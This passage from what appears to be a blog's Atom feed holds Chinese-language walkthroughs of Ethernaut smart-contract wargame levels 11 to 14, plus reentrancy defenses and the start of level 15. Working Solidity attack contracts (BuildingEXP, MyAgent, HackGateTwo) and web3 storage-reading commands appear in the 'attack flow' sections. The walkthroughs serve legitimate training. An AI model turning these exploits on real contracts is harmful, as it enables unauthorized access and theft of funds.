}  }</code></pre><!--1.在假定gas成本不变的情况下，推荐transfer（）是有意义的。--><!--2.gas成本并不恒定。智能合同对这个事实应该是健全的。Solidity的transfer（）和send（）使用硬编码的gas量。--><!--3.应该避免这些方法。请改用.call.value（…）（“”）。--><!--4.这就带来了重新进入的风险。请确保使用可用于防止重入漏洞的健壮方法之一。--><!--5.vyper的send（）也有同样的问题。--><p>2、确保状态变量改变发生在ether被发送(或者任何外部调用)之前，即Solidity官方推荐的检查-生效-交互模式(checks-effects-interactions);</p><pre><code class="js">function withdraw(uint _amount) public {    if(balances[msg.sender] &gt;= _amount) {//检查       balances[msg.sender] -= _amount;//生效       msg.sender.transfer(_amount);//交互    } }</code></pre><p>3、使用互斥锁：添加一个在代码执行过程中锁定合约的状态变量，防止重入调用</p><pre><code class="js">bool reEntrancyMutex = false;function withdraw(uint _amount) public {    require(!reEntrancyMutex);    reEntrancyMutex = true;    if(balances[msg.sender] &gt;= _amount) {      if(msg.sender.call.value(_amount)()) {        _amount;      }      balances[msg.sender] -= _amount;      reEntrancyMutex = false;    } }</code></pre><p>重入在这次攻击中发挥了重要作用，最终导致Ethereum Classic(ETC)的分叉，有关The DAO漏洞的详细分析，可参考下面这篇文章：</p><p><a href="https://link.zhihu.com/?target=http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/">Analysis of the DAO exploithackingdistributed.com</a></p><p>4、OpenZeppelin官方库</p><p><a href="https://link.zhihu.com/?target=https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol">OpenZeppelin/openzeppelin-contractsgithub.com<img src="https://pic2.zhimg.com/v2-216324b4f941cf09cf1dfcb65d287dad_180x120.jpg"></a></p><pre><code class="js">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;/** * @dev Contract module that helps prevent reentrant calls to a function. * * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier * available, which can be applied to functions to make sure there are no nested * (reentrant) calls to them. * * Note that because there is a single `nonReentrant` guard, functions marked as * `nonReentrant` may not call one another. This can be worked around by making * those functions `private`, and then adding `external` `nonReentrant` entry * points to them. * * TIP: If you would like to learn more about reentrancy and alternative ways * to protect against it, check out our blog post * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. */abstract contract ReentrancyGuard {    // Booleans are more expensive than uint256 or any type that takes up a full    // word because each write operation emits an extra SLOAD to first read the    // slot's contents, replace the bits taken up by the boolean, and then write    // back. This is the compiler's defense against contract upgrades and    // pointer aliasing, and it cannot be disabled.    // The values being non-zero value makes deployment a bit more expensive,    // but in exchange the refund on every call to nonReentrant will be lower in    // amount. Since refunds are capped to a percentage of the total    // transaction's gas, it is best to keep them low in cases like this one, to    // increase the likelihood of the full refund coming into effect.    uint256 private constant _NOT_ENTERED = 1;    uint256 private constant _ENTERED = 2;    uint256 private _status;    constructor () {        _status = _NOT_ENTERED;    }    /**     * @dev Prevents a contract from calling itself, directly or indirectly.     * Calling a `nonReentrant` function from another `nonReentrant`     * function is not supported. It is possible to prevent this from happening     * by making the `nonReentrant` function external, and make it call a     * `private` function that does the actual work.     */    modifier nonReentrant() {        // On the first call to nonReentrant, _notEntered will be true        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");        // Any calls to nonReentrant after this point will fail        _status = _ENTERED;        _;        // By storing the original value once again, a refund is triggered (see        // https://eips.ethereum.org/EIPS/eip-2200)        _status = _NOT_ENTERED;    }}</code></pre></address></address></address>]]></content>
+    
+    
+    <summary type="html">第10关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Elevator第11关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/11.Ethernaut-Elevator/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/11.Ethernaut-Elevator/</id>
+    <published>2021-07-21T02:27:00.000Z</published>
+    <updated>2021-08-02T08:27:30.397Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Elevator第11关练习"><a href="#Elevator第11关练习" class="headerlink" title="Elevator第11关练习"></a>Elevator第11关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>这台电梯不会让您到达建筑物的顶部。对吗？</p><ul><li><p>有时候，固执并不擅长守承诺。</p></li><li><p>这期望从.<code>Elevator``Building</code></p></li></ul><p>目标：成为 top，让变量 top 变为 true</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;interface Building {  function isLastFloor(uint) external returns (bool);}//定义了一个接口,这个函数返回你是不是在最顶层contract Elevator {  bool public top;//布尔型变量,是否是top,默认false  uint public floor;//楼层  function goTo(uint _floor) public {    Building building = Building(msg.sender);//如果不是最顶层的话就进入if    if (! building.isLastFloor(_floor)) {      floor = _floor;//拿到你的_floor      top = building.isLastFloor(floor);//让top等于判断结果,所以还是false    }//但是如果你是top的话,没有改top的机会,所以还是false  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>在合约的开头处有一个Building接口，定义了isLastFloor函数，返回值是bool，应该是用来返回这一楼层是否为最顶层，在接口里没有函数是已实现的，类似于抽象合约，可以理解为它仅仅用来提供一个标准，这样继承于它的合约就可以遵照它的标准来进行交互，而接口内的函数在其调用合约内定义即可。</p><p>之后在下面的主合约里，定义了一个bool型的top变量，在goto函数里对传入的_floor变量进行了判断，从逻辑上我们发现判断的条件里如果isLastFloor返回false，通过if后再将isLastFloor的返回值赋给top，这样的话我们的top还是个false，而这里我们要想让top的值变为true，那么我们得想个办法在isLastFloor上动动手脚，由于goTo函数调用了两次isLastFloor，因此我们可以将该函数构造为取反函数即可：</p><pre><code>pragma solidity ^0.4.18;interface Building {  function isLastFloor(uint) external returns (bool);}//定义了一个接口,这个函数返回你是不是在最顶层contract Elevator {  bool public top;//布尔型变量,是否是top,默认false  uint public floor;//楼层  function goTo(uint _floor) public {    Building building = Building(msg.sender);    if (! building.isLastFloor(_floor)) {//如果不是最顶层的话就进入if      floor = _floor;//拿到你的_floor      top = building.isLastFloor(floor);//让top等于判断结果,所以还是false    }//但是如果你是top的话,没有改top的机会,所以还是false  }}contract BuildingEXP{    Elevator ele;    bool t = true;//一开始定义为true    function isLastFloor(uint) view public returns (bool) {        t = !t;//在if那个地方要为false进入         //在top那个地方再次反转为false,这样就能保证top一直都是true啦        return t;    }    function attack(address _addr) public{        ele = Elevator(_addr);        ele.goTo(5);    }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取实例，查看合约地址，顶层bool值，还有floor</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728113343238.png"></p><p>2、部署合约</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728113427972.png"></p><p>发现有一处warning，是因为view产生的，因为在 view 函数中强行改属性也是可以通过编译的，所以可以忽略，有兴趣可以自行将view修改成payable或者no-payable也行</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728113729011.png"></p><p>将合约地址进行传参，点击attack</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728113851105.png"></p><p>可以看到我们的top变成了true，floor变成了5</p><p>3、这时候top就一直是顶层了，快乐提交就行<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728114559696.png"></p>]]></content>
+    
+    
+    <summary type="html">第11关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Privacy第12关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/12.Ethernaut-Privacy/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/12.Ethernaut-Privacy/</id>
+    <published>2021-07-20T10:13:00.000Z</published>
+    <updated>2021-08-02T08:27:30.397Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Privacy第12关练习"><a href="#Privacy第12关练习" class="headerlink" title="Privacy第12关练习"></a>Privacy第12关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>这份合约的创建者非常小心，以保护其存储的敏感区域。</p><p>解锁此合约以通关。</p><p>可能有帮助的事情：</p><ul><li>了解存储的工作原理</li><li>了解参数解析的工作原理</li><li>了解铸造的工作原理</li></ul><p>提示：</p><ul><li>请记住，metamask 只是一种商品。如果出现问题，请使用其他工具。高级游戏可能涉及使用 remix 或您自己的 web3 提供商。</li></ul><p>目标：解锁需要一个 key，而这个 key 是 data[2] 是 private 的</p><p>  在区块链上面没有私密的东西，都是公开的，只要找到就能过关</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Privacy {  bool public locked = true;  uint256 public ID = block.timestamp;  uint8 private flattening = 10;  uint8 private denomination = 255;  uint16 private awkwardness = uint16(now);  bytes32[3] private data;  constructor(bytes32[3] memory _data) public {    data = _data;  }    function unlock(bytes16 _key) public {    require(_key == bytes16(data[2]));    locked = false;  }  /*    A bunch of super advanced solidity algorithms...      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU  */}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>根据solidity 文档中的变量存储原则：静态大小的变量（除 映射mapping 和动态数组之外的所有类型）都从位置 <code>0</code> 开始连续放置在 存储storage 中。如果可能的话，存储需求少于 32 字节的多个变量会被打包到一个 存储插槽storage slot 中，规则如下：</p><ul><li>存储插槽storage slot 的第一项会以低位对齐（即右对齐）的方式储存。</li><li>基本类型仅使用存储它们所需的字节。</li><li>如果 存储插槽storage slot 中的剩余空间不足以储存一个基本类型，那么它会被移入下一个 存储插槽storage slot 。</li><li>结构（struct）和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）。</li></ul><p><a href="https://solidity-cn.readthedocs.io/zh/develop/miscellaneous.html">存储storage 中的状态变量储存结构</a></p><p>例如，按照 <code>uint128，uint128，uint256</code> 的<strong>顺序声明你的存储变量</strong>，而不是 <code>uint128，uint256，uint128</code>， 因为前者只占用两个 存储插槽storage slot，而后者将占用三个。</p><p>分析一下合约中的变量：</p><pre><code>// 1 byte, slot 0bool public locked = true;// 32 bytes, slot 1uint256 public ID = block.timestamp;// 1 byte, slot 2uint8 private flattening = 10;// 1 byte, slot 2uint8 private denomination = 255;// 2 byte, slot 2uint16 private awkwardness = uint16(now);// bytes32[0], 32 bytes, slot 3; bytes32[1], 32 bytes, slot 4; bytes32[2], 32 bytes, slot 5bytes32[3] private data;</code></pre><p>第一个变量是一个bool值占1个byte，和一个slot，按顺序下一个变量ID占有32个bytes，所以需要单独占一个存储插槽storage slot ，变量<code>flattening</code>,<code>denomination</code>,<code>awkwardness</code>加起来占有32bytes，所以他们3个变量占用一个存储槽，最后是3个32bytes的变量，各占一个。因为</p><pre><code>  function unlock(bytes16 _key) public {    require(_key == bytes16(data[2]));    locked = false;  }</code></pre><p>我们所需要的data[2]就是存在于第六个slot中也就是slot 5中，取出的方法有：</p><pre><code class="通过await实现">await web3.eth.getStorageAt(instance, 5);</code></pre><pre><code class="通过提示栏实现">web3.eth.getStorageAt(instance,5,function(x,y){alert(y);})</code></pre><pre><code class="通过控制台实现">web3.eth.getStorageAt(instance,5,function(x,y){console.info(y);})</code></pre><p>最后我们调用函数unlock即可解锁</p><p>需要注意的是，要解锁合约的 <code>_key</code> 是 bytes16 类型的，而 data 是 bytes32 类型的，bytes32 转换到 bytes 16 会截断超出的 bytes，也就是我们只取前 16 个 bytes 就好。</p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取实例，查看锁状态</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728140747908.png"></p><p>2、将第六个存储槽内容取出，slot5：</p><pre><code>web3.eth.getStorageAt(instance,5,function(x,y){console.info(y);})</code></pre><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728151630603.png">4、调用unlock函数解锁，应为它限定了是byte16所以他自己会截断，也可以手动取16bytes数据</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728151702758.png"></p><p>5、为了更加直观的看到存储情况，我们将其一一打印出来对照</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728152112921.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728152401510.png"></p><p>还可以观察发现变量<code>flattening = 10</code> ,<code>和denomination = 255</code>在里面存储着</p><p>6、好了，玩的差不多，快乐提交吧，对了，网上有些地方过关的方法可能错误，多尝试，仔细甄别哦，理解原理才是关键</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728152640325.png"></p>]]></content>
+    
+    
+    <summary type="html">第12关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Gatekeeper One第13关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/13.Ethernaut-Gatekeeper%20One/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/13.Ethernaut-Gatekeeper%20One/</id>
+    <published>2021-07-20T07:59:00.000Z</published>
+    <updated>2021-08-02T08:27:30.398Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Gatekeeper-One第13关练习"><a href="#Gatekeeper-One第13关练习" class="headerlink" title="Gatekeeper One第13关练习"></a>Gatekeeper One第13关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>通过守门员并注册为进入者以通过此级别。</p><p>绕过三个 gate 来执行 enter 函数</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract GatekeeperOne {  using SafeMath for uint256;  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;//要求tx.origin不等于请求者，通过其他合约调用实现绕过  }  modifier gateTwo() {    require(gasleft().mod(8191) == 0);    _;//gas要满足8191取余为0  }  modifier gateThree(bytes8 _gateKey) {      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>从上面了解到要想enter需要满足gateOne、gateTwo、gateThree三个修饰器的检查条件，即需要满足以下条件，先说第一步和第三步：<br>1、gateOne ：通过其他合约来进行调用即可使得msg.sender和tx.origin不等绕过，假设用户通过合约A调用合约B：</p><ul><li><p>对于合约A：tx.origin和msg.sender都是用户</p></li><li><p>对于合约B：tx.origin是用户，msg.sender是合约A的地址</p></li></ul><hr><p>3、gateThree() ：</p><pre><code>modifier gateThree(bytes8 _gateKey) {    require(uint32(_gateKey) == uint16(_gateKey));    require(uint32(_gateKey) != uint64(_gateKey));    require(uint32(_gateKey) == uint16(tx.origin));    _;}</code></pre><ul><li><p>先看最后一个判断 tx.origin 是最初的调用者，就是我们的账户，uint16 是最后 8 字节，要与 uint32 的 key 也就是最后 16 字节相等，所以 key 的最后 8 字节就是 tx.origin 的最后 8 字节</p></li><li><p>同时如果第一个条件 uint32 的 key 要与 uint16 的 key 相等，所以 key 的 uint32 类型 16 字节前面的八个字节要全为 0</p></li><li><p>再看中间那个，key 的后 16 字节还不能和整个 32 字节相等，前面只要不是 0 就不会相等</p></li></ul><p>uint16(address) 的转换会保留 address 最后两个字节，由上述 1，3 可得，uint32(uint64(_gateKey)) 等于 uint32(tx.origin) &amp; 0x0000FFFF。再结合上述 2，只要 _gateKey 的最后 4 个字节为 uint32(tx.origin) &amp; 0x0000FFFF，其前面的 4 个字节可以为全 0 外的任意值。我们这里直接取 player 地址的最后八个字节，然后将 <code>tx.origin</code> 倒数三四字节换成 0000  得到 _gateKey。</p><p>综上，key 如果是bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF的话就正好可以</p><hr><p>2、gateTwo ：这里的msg.gas 指的是运行到当前指令还剩余的 gas 量，要能整除 8191。那我们只需要 8191+x ，x 为从开始到运行完 msg.gas 所消耗的 gas。通过查阅资料发现msg.gas在文档里的描述是remaining gas，在Javascript VM环境下进行Debug可在Step detail 栏中可以看到这个变量，我们尝试在VM中进行调试一下：</p><pre><code>pragma solidity ^0.4.18;contract GatekeeperOne {  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;//可以部署一个中间合约来调用绕过  }  modifier gateTwo() {    require(msg.gas % 8191 == 0);    _;//gas要满足8191取余为0  }  modifier gateThree(bytes8 _gateKey) {    require(uint32(_gateKey) == uint16(_gateKey));    require(uint32(_gateKey) != uint64(_gateKey));    require(uint32(_gateKey) == uint16(tx.origin));    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}contract MyAgent {    GatekeeperOne c;      function MyAgent(address _c) public {        c = GatekeeperOne(_c);    }    function exploit() public {        bytes8 _gateKey = bytes8(msg.sender) &amp; 0xffffffff0000ffff;        c.enter.gas(81910)(_gateKey);            }}</code></pre><p>使用这个代码在remix中运行，编译成功</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728182952119.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728183204095.png"></p><p>先获取到合约地址</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728183306685.png"></p><p>将合约地址复制给MyAgent中去进行Deploy</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728183442225.png"></p><p>直接exploit，报错，然后点击debug，注意，这里我们是为了得到执行到第二步的gas查看的<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728184750142.png"></p><p>通过将游标移动到大致这个位置，目的是找到GAS和DUP2这两个地方，GAS关键字是获取执行可用的gas。由于EVM是栈虚拟机，因此此处需要注意获取到的gas后的dup2，dup2是将栈内的第2个元素（从栈顶向下算）移至栈顶。查看他们Step details中的gas和remaining gas，其中gas表示这一小步到下一小步需要的gas使用量，remaining gas表示gas的剩余量，而我们所需要的msg.gas就是remaining gas。<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728185021596.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728185116971.png"></p><p>也就是说我们从最开始给到的gas，81910，执行到我们的第二步使用了81910-81695=215的gas，这里妙就妙在81910本身就是8191的倍数，只要我们如果我们想要让这一步结束之后 remaining gas % 8191 = 0 的话，或者说想要让他执行完之后刚好是 81910 的话，就需要让之前的值为：213+2+81910。所以想要绕过第二个关卡的话，值应该是 213+2+81910。这时候我们只需要把代码中给到的gas修改成81910+215=82125就可以，让我们来验证一下</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728190814576.png"></p><p><code>entrant</code> 已经从 <code>0x0000000000000000000000000000000000000000</code> 变为你的 player 地址，测试成功，开启实战吧</p><hr><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取新实例，查看玩家地址，合约地址，查看entrant当前数值</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728191237471.png"></p><p>2、直接使用相同的合约，复制合约地址给攻击合约进行编译，但是这里存在一个问题，我们并不知道通过remix上链和到达我们所需要的GAS的时候到底需要多少gas，这里需要测试几下。直接编译上链exploit<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728195333261.png">点击exploit会失败，我们去钱包里面找到失败的交易</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728195820468.png"></p><p>去etherscan上查看，点击右上角小标中的GETH调试追溯</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728195918148.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728200125669.png">、</p><p>找到GAS，并且分析整个上链执行的过程并记录</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728202312192.png"></p><p>几组数据观察可以发现，21064和5042可能是上链或者链上数据使用的gas，而从step[101]到GAS中间始终是252，step[101]正好是我们合约中所输入的gas，（第二组数据可能是因为我修改了gaslimit太小产生的溢出出错，这些都不重要），我们只要让[101]中的数等于81910+2+252=82164即可（注意这里需要加2，因为gas走到下一步需要2的gas）于是修改gas数值</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728203007877.png"></p><p>部署合约，地址，编译，攻击，成功！！！</p><p>3、检查结果，快乐提交！<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210728203202200.png"></p>]]></content>
+    
+    
+    <summary type="html">第13关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Gatekeeper Two第14关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/14.Ethernaut-Gatekeeper%20Two/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/14.Ethernaut-Gatekeeper%20Two/</id>
+    <published>2021-07-20T05:19:00.000Z</published>
+    <updated>2021-08-02T08:27:30.399Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Gatekeeper-Two第14关练习"><a href="#Gatekeeper-Two第14关练习" class="headerlink" title="Gatekeeper Two第14关练习"></a>Gatekeeper Two第14关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>通过看门人的三道检查，成为进入者(entrant)。</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract GatekeeperTwo {  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;  }  modifier gateTwo() {    uint x;    assembly { x := extcodesize(caller()) }    require(x == 0);    _;  }  modifier gateThree(bytes8 _gateKey) {    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p><code>gateOne()</code>：我们可以用第三方合约来调用 <code>enter()</code> 实现绕过</p><p><code>gateTwo()</code>：gateTwo中extcodesize 用来获取指定地址的合约代码大小。这里使用的是内联汇编来获取调用方(caller)的代码大小，一般来说，当caller为合约时，获取的大小为合约字节码大小,caller为账户时，获取的大小为 0 。条件为调用方代码大小为0 ，也就是说，在执行初始化代码（构造函数），而新的区块还未添加到链上的时候，新的地址已经生成，然而代码区为空。此时，调用 <code>EXTCODESIZE()</code> 返回为 0。因此，我们需要把攻击合约的调用操作写在 constructor 构造函数中。</p><p><code>gateThree()</code>：传入一个八字节的 key，把 msg.sender 的 hash 计算出来与 uint64 类型的 key 异或，要等与 0-1，也就是 0xFFFFFFFFFFFFFFFF，只要我们先用 uint64(keccak256(msg.sender)) 与 0xFFFFFFFFFFFFFFFF 进行异或，这样再次异或的时候就成了 0xFFFFFFFFFFFFFFFF，也就符合条件了（优先级为 – 大于 ^ 大于 ==）最后攻击合约如下：</p><pre><code>pragma solidity ^0.4.25;contract GatekeeperTwo {  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;  }  modifier gateTwo() {    uint x;    assembly { x := extcodesize(caller) }    //用内联汇编来获取调用方caller的代码大小    require(x == 0);    _;  }  modifier gateThree(bytes8 _gateKey) {    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}contract HackGateTwo {    constructor(address _addr) public {        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));        (bool success, ) = _addr.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));        require(success);    }}</code></pre><p>要注意使用constructor函数，以下两个同理：</p><pre><code>contract HackGateTwo {    constructor(address _addr) public {        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));        (bool success, ) = _addr.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));        require(success);    }}</code></pre><pre><code>contract Attack {    GatekeeperTwo target = GatekeeperTwo(instance_address);    constructor(address instance_address) public {        target.enter((bytes8)(uint64(keccak256(address(this))) ^ (uint64(0) - 1)));    }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取新实例，查看合约信息，合约地址，合约entrant()<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729101109854.png"></p><p>2、部署合约，将合约地址复制到攻击合约中编译执行<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729105406644.png"></p><p>3、查看 <code>entrant</code> 发现已经发生变化，说明攻击成功，提交即可过关。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729105456225.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210729105645043.png"></p>]]></content>
+    
+    
+    <summary type="html">第14关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Naught Coin第15关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/15.Ethernaut-Naught%20Coin/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/15.Ethernaut-Naught%20Coin/</id>
+    <published>2021-07-20T02:51:00.000Z</published>
+    <updated>2021-08-02T08:27:30.398Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Naught-Coin第15关练习"><a href="#Naught-Coin第15关练习" class="headerlink" title="Naught Coin第15关练习"></a>Naught Coin第15关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>NaughtCoin 是一个标准的 ERC20 token 合约，并且你已经拥有了所有的 token。但是问题是，需要10年后才能够执行 transfer 将 token 转移。现在你的目标是突破限制，将所有 token 转移到别的地址，使用合约中你的 token 余额变为 0。</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/token/ERC20/ERC20.sol'; contract NaughtCoin is ERC20 {  // string public constant name = 'NaughtCoin';  // string public constant symbol = '0x0';  // uint public constant decimals = 18;  uint public timeLock = now + 10 * 365 days;  uint256 public INITIAL_SUPPLY;  address public player;  constructor(address _player)   ERC20('NaughtCoin', '0x0')  public {    player = _player;    INITIAL_SUPPLY = 1000000 * 